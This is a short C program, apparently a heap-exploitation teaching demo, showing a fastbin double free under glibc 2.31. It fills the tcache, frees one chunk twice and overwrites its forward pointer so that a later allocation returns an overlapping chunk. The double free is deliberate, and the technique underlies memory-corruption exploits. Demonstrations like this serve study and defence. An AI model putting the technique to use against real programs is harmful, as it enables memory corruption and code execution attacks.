#include<stdio.h>
#include<stdlib.h>
#include<assert.h>

signed main(){
	
	/*
	The fastbin double free under libc-2.31

	*/

	// fill up tcache
	char *tcache[15];
	for(int i=0;i<7;i++){
		tcache[i] = malloc(0x40);
	}
	for(int i=0;i<7;i++){
		free(tcache[i]);
	}
	char *a = calloc(1, 0x40);
	char *b = calloc(1, 0x40);
	char *c = calloc(1, 0x40);

	
	// fastbin
	free(a);
	free(b);
	free(a);
	// a->b->a
	a = calloc(1, 0x40);
	long long *a_ptr = (long long*)a;
	a_ptr[0] = c-0x10;
	b = calloc(1, 0x40);
	char *a1 = calloc(1, 0x40);
	char *c1 = calloc(1, 0x40);
	printf("chunk C @ %p\n",c);
	printf("chunk C1 @ %p\n",c1);
	assert(c==c1);
	return 0;
}
